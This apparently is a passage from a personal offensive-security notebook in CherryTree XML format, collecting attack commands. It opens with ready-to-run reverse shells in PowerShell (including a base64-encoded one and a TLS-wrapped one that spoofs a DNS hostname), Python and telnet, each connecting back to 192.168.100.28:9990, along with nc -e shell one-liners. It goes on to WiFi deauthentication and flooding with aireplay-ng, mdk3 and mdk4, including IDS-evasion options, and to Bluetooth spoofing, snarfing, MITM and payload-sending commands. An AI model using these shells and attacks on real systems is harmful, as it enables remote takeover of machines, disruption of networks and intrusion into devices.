powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('192.168.100.28', 9990);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL&gt; ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2&gt;&amp;1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"

</rich_text>
          <rich_text weight="heavy">powershell #3</rich_text>
          <rich_text> (Base 64)
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMAAwAC4AMgA4ACIALAA5ADkAOQAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

</rich_text>
          <rich_text weight="heavy">powershell #4</rich_text>
          <rich_text>
$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('192.168.100.28', 9990);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL&gt; ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2&gt;&amp;1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()

</rich_text>
          <rich_text weight="heavy">python</rich_text>
          <rich_text>
export RHOST="192.168.100.28";export RPORT=9990;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

</rich_text>
          <rich_text weight="heavy">python windows</rich_text>
          <rich_text>
import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) &gt; 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.100.28",9990))

p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
    
</rich_text>
          <rich_text weight="heavy">telnet</rich_text>
          <rich_text>
TF=$(mktemp -u);mkfifo $TF &amp;&amp; telnet 192.168.100.28 9990 0&lt;$TF | sh 1&gt;$TF</rich_text>
        </node>
      </node>
      <node name="python" unique_id="385" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728545515" ts_lastsave="1730173048">
        <rich_text scale="h2" weight="heavy">Execute SHELL:</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#3333d1d17a7a">$ python -c 'import pty; pty.spawn("/bin/sh")'	</rich_text>
        <rich_text>		</rich_text>
        <rich_text foreground="#35358484e4e4" weight="heavy"># Type:1</rich_text>
        <rich_text> ***
</rich_text>
        <rich_text foreground="#3333d1d17a7a">$ python -c 'import pty; pty.spawn("/usr/bin/sh")'</rich_text>
        <rich_text>
-
</rich_text>
        <rich_text foreground="#3333d1d17a7a">$ python -c 'import os; os.system("/bin/sh")'	</rich_text>
        <rich_text>		</rich_text>
        <rich_text foreground="#35358484e4e4" weight="heavy"># Type:2</rich_text>
        <rich_text> *


</rich_text>
        <rich_text scale="h2" weight="heavy">Call netcat</rich_text>
        <rich_text>(nc)</rich_text>
        <rich_text scale="h2" weight="heavy">:</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#3333d1d17a7a">$ python3 -c 'import os; os.system("nc &lt;ip&gt; &lt;port&gt; -e /bin/sh")'</rich_text>
        <rich_text>

</rich_text>
        <rich_text weight="heavy">Trick:</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#3333d1d17a7a">$ (python3 -c 'import os; os.system("nc &lt;ip&gt; &lt;port&gt; -e /bin/sh")' &amp;)</rich_text>
      </node>
    </node>
    <node name="WiFi DoS Attack" unique_id="378" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="177" is_bold="0" foreground="" ts_creation="1728489373" ts_lastsave="1729191362">
      <rich_text underline="single" scale="h1" weight="heavy">DoS ATTACK</rich_text>
      <rich_text> (source:</rich_text>
      <rich_text link="webs https://amartyanambiar.github.io/mynotes/wireless/WIRELESS_NETWORK--Wi-Fi_HACKING--DoS_ATTACK.html">https://amartyanambiar.github.io/mynotes/wireless/WIRELESS_NETWORK--Wi-Fi_HACKING--DoS_ATTACK.html</rich_text>
      <rich_text>)

</rich_text>
      <rich_text underline="single" weight="heavy">DoS - Denial of Service attack</rich_text>
      <rich_text>
• Shutdown a system,server,making it inaccessible to its intended users.
• Dos attacks are accomplished by flooding target with trafic or sending it information that slows down processes.
</rich_text>
      <rich_text weight="heavy">-</rich_text>
      <rich_text>Innaccesible services
</rich_text>
      <rich_text weight="heavy">-</rich_text>
      <rich_text>Interruption of network 
</rich_text>
      <rich_text weight="heavy">-</rich_text>
      <rich_text>Connection interference

</rich_text>
      <rich_text underline="single" weight="heavy">Using aircrack tools</rich_text>
      <rich_text>:
1. </rich_text>
      <rich_text weight="heavy">airodump-ng wlan0mon</rich_text>
      <rich_text>
2. </rich_text>
      <rich_text weight="heavy">airodump-ng -c 7 --bssid ************** wlan0mon</rich_text>
      <rich_text>    :network specific details
3. </rich_text>
      <rich_text weight="heavy">aireplay-ng -0 20 -a ************** wlan0mon</rich_text>
      <rich_text>              :deauthenticates client

</rich_text>
      <rich_text underline="single" weight="heavy">mdk3:</rich_text>
      <rich_text>
• </rich_text>
      <rich_text weight="heavy">mdk3 wlan0mon b -c 7 -f 'file path' </rich_text>
      <rich_text>                          :Create fake router networks</rich_text>
      <node name="airmon-ng" unique_id="379" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728489458" ts_lastsave="1728494412">
        <rich_text foreground="#ffffa3a34848">☐ GERNERAL PART</rich_text>
        <rich_text>
</rich_text>
        <rich_text scale="h1">Step1: Find WiFi Interface Card</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#3333d1d17a7a" weight="heavy">$ iwconfig</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h1">Step2: Kill Processes</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#3333d1d17a7a" weight="heavy"># airmon-ng</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy"> check kill</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h1">Step3: Enable Monitor Mode</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#3333d1d17a7a" weight="heavy"># airmon-ng start</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy"> </rich_text>
        <rich_text weight="heavy">&lt;device&gt;
</rich_text>
        <rich_text>
</rich_text>
        <rich_text scale="h1">Step4: Scan WiFi Networks</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#3333d1d17a7a" weight="heavy"># airodump-ng</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy"> </rich_text>
        <rich_text weight="heavy">&lt;device&gt;</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#ffffa3a34848">☐ GET HANDSHAKE</rich_text>
        <rich_text>
</rich_text>
        <rich_text scale="h1">Step5: Lock The Target</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#3333d1d17a7a" weight="heavy"># airodump-ng</rich_text>
        <rich_text weight="heavy"> &lt;device&gt; </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">--bssid/-b</rich_text>
        <rich_text weight="heavy"> &lt;BSSID&gt; </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">-c</rich_text>
        <rich_text weight="heavy"> &lt;channel&gt; </rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#ffffa3a34848">☐ DoS ATTACK</rich_text>
        <rich_text>
</rich_text>
        <rich_text scale="h1">Step6: Attack Begin</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#3333d1d17a7a" weight="heavy"># aireplay-ng</rich_text>
        <rich_text weight="heavy"> &lt;device&gt; </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">--deauth/-0</rich_text>
        <rich_text> 0 </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">-a </rich_text>
        <rich_text weight="heavy">&lt;BSSID&gt;</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#9a9a99999696"> usage: aireplay-ng &lt;options&gt; &lt;replay interface&gt; </rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#9a9a99999696">
 </rich_text>
        <rich_text foreground="#9a9a99999696" weight="heavy">Filter</rich_text>
        <rich_text foreground="#9a9a99999696"> options: 

     -b bssid  : MAC address, Access Point 
     -d dmac   : MAC address, Destination 
     -s smac   : MAC address, Source

 </rich_text>
        <rich_text foreground="#9a9a99999696" weight="heavy">Replay</rich_text>
        <rich_text foreground="#9a9a99999696"> options: 

     -a bssid  : set Access Point MAC address 
     -c dmac   : set Destination  MAC address 
     -h smac   : set Source       MAC address 


 </rich_text>
        <rich_text foreground="#9a9a99999696" weight="heavy">Attack modes</rich_text>
        <rich_text foreground="#9a9a99999696"> (numbers can still be used): 

     --deauth      count : deauthenticate 1 or all stations (-0)
     --fakeauth    delay : fake authentication with AP (-1) 
     --interactive       : interactive frame selection (-2) 
     --arpreplay         : standard ARP-request replay (-3) 
     --chopchop          : decrypt/chopchop WEP packet (-4) 
     --fragment          : generates valid keystream   (-5) 
     --caffe-latte       : query a client for new IVs  (-6) 
     --cfrag             : fragments against a client  (-7) 
     --migmode           : attacks WPA migration mode  (-8) 
     --test              : tests injection and quality (-9) 

</rich_text>
        <rich_text foreground="#3333d1d17a7a" weight="heavy"># aireplay-ng</rich_text>
        <rich_text weight="heavy"> &lt;device&gt; </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">-0</rich_text>
        <rich_text weight="heavy"> &lt;number of packets&gt; </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">-a</rich_text>
        <rich_text weight="heavy"> &lt;bssid of target network&gt; </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">-c</rich_text>
        <rich_text weight="heavy"> &lt;bssid of target client&gt;

</rich_text>
        <rich_text foreground="#3333d1d17a7a" weight="heavy"># aireplay</rich_text>
        <rich_text weight="heavy"> wlan0 </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">-0</rich_text>
        <rich_text weight="heavy"> 0 </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">-a</rich_text>
        <rich_text weight="heavy"> &lt;MAC:access point&gt; </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">-c</rich_text>
        <rich_text weight="heavy"> &lt;MAC:client&gt;</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">wlan0</rich_text>
        <rich_text>	: device
</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-0</rich_text>
        <rich_text> 0	: attack(type 0) for duration of 0(infinity)
</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-a</rich_text>
        <rich_text> MAC	: bssid of target network / access point
</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-c</rich_text>
        <rich_text> MAC	: bssid of target client / client</rich_text>
        <node name="aireplay --help" unique_id="380" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728492564" ts_lastsave="1728492648">
          <rich_text foreground="#18b2b2">aireplay-ng</rich_text>
          <rich_text> </rich_text>
          <rich_text foreground="#18b218">--help</rich_text>
          <rich_text> 
 
  Aireplay-ng 1.7  - (C) 2006-2022 Thomas d'Otreppe 
  https://www.aircrack-ng.org 
 
  usage: aireplay-ng &lt;options&gt; &lt;replay interface&gt; 
 
  Filter options: 
 
</rich_text>
          <rich_text weight="heavy">      -b bssid  : MAC address, Access Point 
      -d dmac   : MAC address, Destination 
      -s smac   : MAC address, Source </rich_text>
          <rich_text>
      -m len    : minimum packet length 
      -n len    : maximum packet length 
      -u type   : frame control, type    field 
      -v subt   : frame control, subtype field 
      -t tods   : frame control, To      DS bit 
      -f fromds : frame control, From    DS bit 
      -w iswep  : frame control, WEP     bit 
      -D        : disable AP detection 
 
  Replay options: 
 
      -x nbpps  : number of packets per second 
      -p fctrl  : set frame control word (hex) 
</rich_text>
          <rich_text weight="heavy">      -a bssid  : set Access Point MAC address 
      -c dmac   : set Destination  MAC address 
      -h smac   : set Source       MAC address </rich_text>
          <rich_text>
      -g value  : change ring buffer size (default: 8) 
      -F        : choose first matching packet 
 
      Fakeauth attack options: 
 
      -e essid  : set target AP SSID 
</rich_text>
          <rich_text weight="heavy">      -o npckts : number of packets per burst (0=auto, default: 1) </rich_text>
          <rich_text>
      -q sec    : seconds between keep-alives 
      -Q        : send reassociation requests 
      -y prga   : keystream for shared key auth 
      -T n      : exit after retry fake auth request n time 
 
      Arp Replay attack options: 
 
      -j        : inject FromDS packets 
 
      Fragmentation attack options: 
 
      -k IP     : set destination IP in fragments 
      -l IP     : set source IP in fragments 
 
      Test attack options: 
 
      -B        : activates the bitrate test 
 
  Source options: 
 
      -i iface  : capture packets from this interface 
      -r file   : extract packets from this pcap file 
 
  Miscellaneous options: 
 
      -R                    : disable /dev/rtc usage 
      --ignore-negative-one : if the interface's channel can't be determined, 
                              ignore the mismatch, needed for unpatched cfg80211 
      --deauth-rc rc        : Deauthentication reason code [0-254] (Default: 7) 
 
  Attack modes (numbers can still be used): 
 
      --deauth      count : deauthenticate 1 or all stations (-0) 
      --fakeauth    delay : fake authentication with AP (-1) 
      --interactive       : interactive frame selection (-2) 
      --arpreplay         : standard ARP-request replay (-3) 
      --chopchop          : decrypt/chopchop WEP packet (-4) 
      --fragment          : generates valid keystream   (-5) 
      --caffe-latte       : query a client for new IVs  (-6) 
      --cfrag             : fragments against a client  (-7) 
      --migmode           : attacks WPA migration mode  (-8) 
      --test              : tests injection and quality (-9) 
 
      --help              : Displays this usage screen
 
</rich_text>
        </node>
      </node>
      <node name="mdk3" unique_id="381" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728494435" ts_lastsave="1728498651">
        <rich_text>☐ </rich_text>
        <rich_text weight="heavy">Basic Command:</rich_text>
        <rich_text>
To perform fake SSID flooding, use:
</rich_text>
        <rich_text foreground="#3333d1d17a7a">sudo mdk3 wlan0mon </rich_text>
        <rich_text foreground="#dcdc8a8adddd">b</rich_text>
        <rich_text foreground="#3333d1d17a7a"> -c 1</rich_text>
        <rich_text>
• mdk3 is the tool you’re using.
• wlan0mon is your wireless interface in monitor mode.
• b is the mode for beacon flood attacks.
• -c 1 specifies the channel number (1 in this case). Change this based on your target’s channel.

☐ </rich_text>
        <rich_text weight="heavy">Execute Fake SSID Flooding
</rich_text>
        <rich_text>Fake SSID flooding confuses users by flooding the WiFi network  with fake access points, making it hard to identify the real network.</rich_text>
        <rich_text weight="heavy">
Run the Command:</rich_text>
        <rich_text> Execute the command in the terminal:
</rich_text>
        <rich_text foreground="#3333d1d17a7a">sudo mdk3 wlan0mon </rich_text>
        <rich_text foreground="#dcdc8a8adddd">b</rich_text>
        <rich_text foreground="#3333d1d17a7a"> -c 1</rich_text>
        <rich_text>
• This command will create multiple fake SSIDs on the specified  channel, causing confusion for users trying to find the legitimate  network.

☐ </rich_text>
        <rich_text weight="heavy">Broadcast Custom SSIDs</rich_text>
        <rich_text>
Custom SSID flooding gives you more control by allowing you to create and broadcast a list of specific SSIDs.
</rich_text>
        <rich_text weight="heavy">Broadcast Command:</rich_text>
        <rich_text> Use the following command to broadcast custom SSIDs:
</rich_text>
        <rich_text foreground="#3333d1d17a7a">sudo mdk3 wlan0mon </rich_text>
        <rich_text foreground="#dcdc8a8adddd">b</rich_text>
        <rich_text foreground="#3333d1d17a7a"> -c 1 -f ssid_list.txt</rich_text>
        <rich_text>
• </rich_text>
        <rich_text weight="heavy">-f ssid_list.txt </rich_text>
        <rich_text>specifies the file containing your custom SSIDs.

☐ </rich_text>
        <rich_text weight="heavy">Execute Authentication Flooding</rich_text>
        <rich_text>
Authentication flooding overwhelms the target access point with  fake authentication requests, potentially causing it to crash or slow  down.
</rich_text>
        <rich_text weight="heavy">Run the Command: </rich_text>
        <rich_text>Replace &lt;BSSID&gt; with the target access point BSSID and execute the command:
</rich_text>
        <rich_text foreground="#3333d1d17a7a">sudo mdk3 wlan0mon </rich_text>
        <rich_text foreground="#f9f9f0f06b6b">a</rich_text>
        <rich_text foreground="#3333d1d17a7a"> -a &lt;BSSID&gt;</rich_text>
        <rich_text>

☐ </rich_text>
        <rich_text weight="heavy">Execute Deauthentication Flooding</rich_text>
        <rich_text>
Deauthentication attacks forcefully disconnect users from the WiFi network. This requires a list of target MAC addresses.
</rich_text>
        <rich_text weight="heavy">Run the Command:</rich_text>
        <rich_text> Use the following command to perform the attack:
</rich_text>
        <rich_text foreground="#3333d1d17a7a">sudo mdk3 wlan0mon </rich_text>
        <rich_text foreground="#f6f661615151">d</rich_text>
        <rich_text foreground="#3333d1d17a7a"> -b blacklist.txt</rich_text>
        <rich_text>
• d is the mode for deauthentication attacks.
• -b blacklist.txt specifies the file containing target MAC addresses.

☐</rich_text>
        <rich_text weight="heavy"> Combination Attacks</rich_text>
        <rich_text>
Terminal 1:
</rich_text>
        <rich_text foreground="#3333d1d17a7a">sudo mdk3 wlan0mon </rich_text>
        <rich_text foreground="#dcdc8a8adddd">b </rich_text>
        <rich_text foreground="#3333d1d17a7a">-c 1</rich_text>
        <rich_text>
Terminal 2:
</rich_text>
        <rich_text foreground="#3333d1d17a7a">sudo mdk3 wlan0mon </rich_text>
        <rich_text foreground="#f6f661615151">d</rich_text>
        <rich_text foreground="#3333d1d17a7a"> -b blacklist.txt</rich_text>
        <node name="--help" unique_id="382" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728495154" ts_lastsave="1728495175">
          <rich_text>MDK 3.0 v6 - "Yeah, well, whatever" 
by ASPj of k2wrlz, using the osdep library from aircrack-ng 
And with lots of help from the great aircrack-ng community: 
Antragon, moongray, Ace, Zero_Chaos, Hirte, thefkboss, ducttape, 
telek0miker, Le_Vert, sorbo, Andy Green, bahathir and Dawid Gajownik 
THANK YOU! 
 
MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses. 
IMPORTANT: It is your responsibility to make sure you have permission from the 
network owner before running MDK against it. 
 
This code is licenced under the GPLv2 
 
MDK USAGE: 
mdk3 &lt;interface&gt; &lt;test_mode&gt; [test_options] 
 
Try mdk3 --fullhelp for all test options 
Try mdk3 --help &lt;test_mode&gt; for info about one test only 
 
TEST MODES: 
b   - Beacon Flood Mode 
      Sends beacon frames to show fake APs at clients. 
      This can sometimes crash network scanners and even drivers! 
a   - Authentication DoS mode 
      Sends authentication frames to all APs found in range. 
      Too much clients freeze or reset some APs. 
p   - Basic probing and ESSID Bruteforce mode 
      Probes AP and check for answer, useful for checking if SSID has 
      been correctly decloaked or if AP is in your adaptors sending range 
      SSID Bruteforcing is also possible with this test mode. 
d   - Deauthentication / Disassociation Amok Mode 
      Kicks everybody found from AP 
m   - Michael shutdown exploitation (TKIP) 
      Cancels all traffic continuously 
x   - 802.1X tests 
w   - WIDS/WIPS Confusion 
      Confuse/Abuse Intrusion Detection and Prevention Systems 
f   - MAC filter bruteforce mode 
      This test uses a list of known client MAC Addresses and tries to 
      authenticate them to the given AP while dynamically changing 
      its response timeout for best performance. It currently works only 
      on APs who deny an open authentication request properly 
g   - WPA Downgrade test 
      deauthenticates Stations and APs sending WPA encrypted packets. 
      With this test you can check if the sysadmin will try setting his 
      network to WEP or disable encryption.
 </rich_text>
        </node>
      </node>
      <node name="mdk4" unique_id="383" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728496003" ts_lastsave="1728501010">
        <node name="--help" unique_id="384" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728501007" ts_lastsave="1728501013">
          <rich_text foreground="#18b2b2">mdk4</rich_text>
          <rich_text> </rich_text>
          <rich_text foreground="#18b218">--help</rich_text>
          <rich_text>

MDK4 4.2 - "Awesome! Supports Proof-of-concept of WiFi protocol implementation vulnerability testing"
by E7mer, thanks to the author of MDK3 and aircrack-ng community.
MDK4 is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.
IMPORTANT: It is your responsibility to make sure you have permission from the
network owner before running MDK4 against it.

This code is licenced under the GPLv3 or later

MDK4 USAGE:
mdk4 &lt;interface&gt; &lt;attack_mode&gt; [attack_options]
mdk4 &lt;interface in&gt; &lt;interface out&gt; &lt;attack_mode&gt; [attack_options]

Try mdk4 --fullhelp for all attack options
Try mdk4 --help &lt;attack_mode&gt; for info about one attack only


###### This version supports IDS Evasion (Ghosting) ######
# Just append  --ghost &lt;period&gt;,&lt;max_rate&gt;,&lt;min_txpower&gt; #
# after your attack mode identifier to enable ghosting!  #
# &lt;period&gt;      : How often (in ms) to switch rate/power #
# &lt;max_rate&gt;    : Maximum Bitrate to use in MBit         #
# &lt;min_txpower&gt; : Minimum TX power in dBm to use         #
# NOTE: Does not fully work with every driver, YMMV...   #
##########################################################

#### This version supports IDS Evasion  (Fragmenting) ####
# Just append  --frag &lt;min_frags&gt;,&lt;max_frags&gt;,&lt;percent&gt;  #
# after your attack mode identifier to fragment all      #
# outgoing packets, possibly avoiding lots of IDS!       #
# &lt;min_frags&gt; : Minimum fragments to split packets into  #
# &lt;max_frags&gt; : Maximum amount of fragments to create    #
# &lt;percent&gt;   : Percantage of packets to fragment        #
# NOTE: May not fully work with every driver, YMMV...    #
# HINT: Set max_frags to 0 to enable standard compliance #
##########################################################

Loaded 10 attack modules


ATTACK MODE b: Beacon Flooding
  Sends beacon frames to show fake APs at clients.
  This can sometimes crash network scanners and even drivers!

ATTACK MODE a: Authentication Denial-Of-Service
  Sends authentication frames to all APs found in range.
  Too many clients can freeze or reset several APs.

ATTACK MODE p: SSID Probing and Bruteforcing
  Probes APs and checks for answer, useful for checking if SSID has
  been correctly decloaked and if AP is in your sending range.
  Bruteforcing of hidden SSIDs with or without a wordlist is also available.

ATTACK MODE d: Deauthentication and Disassociation
  Sends deauthentication and disassociation packets to stations
  based on data traffic to disconnect all clients from an AP.

ATTACK MODE m: Michael Countermeasures Exploitation
  Sends random packets or re-injects duplicates on another QoS queue
  to provoke Michael Countermeasures on TKIP APs.
  AP will then shutdown for a whole minute, making this an effective DoS.

ATTACK MODE e: EAPOL Start and Logoff Packet Injection
  Floods an AP with EAPOL Start frames to keep it busy with fake sessions
  and thus disables it to handle any legitimate clients.
  Or logs off clients by injecting fake EAPOL Logoff messages.

ATTACK MODE s: Attacks for IEEE 802.11s mesh networks
  Various attacks on link management and routing in mesh networks.
  Flood neighbors and routes, create black holes and divert traffic!

ATTACK MODE w: WIDS Confusion
  Confuse/Abuse Intrusion Detection and Prevention Systems by
  cross-connecting clients to multiple WDS nodes or fake rogue APs.

ATTACK MODE f: Packet Fuzzer
  A simple packet fuzzer with multiple packet sources
  and a nice set of modifiers. Be careful!

ATTACK MODE x: Proof-of-concept of WiFi protocol implementation vulnerability testing
  Proof-of-concept of WiFi protocol implementation vulnerability,
  to test whether the device has wifi vulnerabilities.
  It may cause the wifi connection to be disconnected or the target device to crash.</rich_text>
        </node>
      </node>
    </node>
    <node name="Bluetooth" unique_id="307" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="158" is_bold="0" foreground="" ts_creation="1718601441" ts_lastsave="1728276167">
      <rich_text># bdaddr
sudo bdaddr -i hci0 XX:XX:XX:XX:XX:XX

# Connect and interact with Bluetooth devices using Bluetoothctl
bluetoothctl
[bluetooth]# power on
[bluetooth]# agent on
[bluetooth]# scan on
[bluetooth]# pair XX:XX:XX:XX:XX:XX

# Send message
bluetoothctl
[bluetooth]# connect XX:XX:XX:XX:XX:XX
[DeviceName]# send "Hello, payload!"

# Scan for nearby Bluetooth devices
sudo hcitool scan

# Launch btscanner GUI (graphical user interface)
btscanner

# Start BlueSniff for Bluetooth device discovery
sudo bluesniff

# Spoof Bluetooth MAC address using spooftooph
sudo spooftooph -i hci0 -a XX:XX:XX:XX:XX:XX

# Launch Bettercap and enable Bluetooth module
sudo bettercap
[0] &gt; bluetooth.show
[0] &gt; bluetooth.scan on

# Exploit Bluetooth Low Energy (BLE) devices using Btlejuice
sudo btlejuice

# Capture and analyze Bluetooth Low Energy (BLE) packets using Ubertooth
sudo ubertooth-btle -f

# Retrieve information from Bluetooth devices using Bluesnarfer
bluesnarfer -r 1-100 -B XX:XX:XX:XX:XX:XX

# Proxy Bluetooth connections and perform MITM attacks using Btproxy
sudo btproxy -u XX:XX:XX:XX:XX:XX -t XX:XX:XX:XX:XX:XX

## PAYLOAD

# Send a payload to a Bluetooth device using sploitctl
sploitctl --target XX:XX:XX:XX:XX:XX --payload /path/to/payload.bin

btkeyboard -d XX:XX:XX:XX:XX:XX "Hello, payload!"

obexftp -b XX:XX:XX:XX:XX:XX -c /path/to/payload.txt</rich_text>
      <node name="python" unique_id="308" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1718601465" ts_lastsave="1718601632">
        <rich_text>from bluetooth import BluetoothSocket, RFCOMM

target_address = "XX:XX:XX:XX:XX:XX"
port = 1

sock = BluetoothSocket(RFCOMM)
sock.connect((target_address, port))
sock.send("Hello, payload!")
sock.close()</rich_text>
      </node>
    </node>
    <node name="WindowsServer" unique_id="309" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="121" is_bold="0" foreground="" ts_creation="1718601571" ts_lastsave="1729191976">
      <rich_text scale="h2" foreground="#e8eaed" weight="heavy">WindowsServer VUN</rich_text>
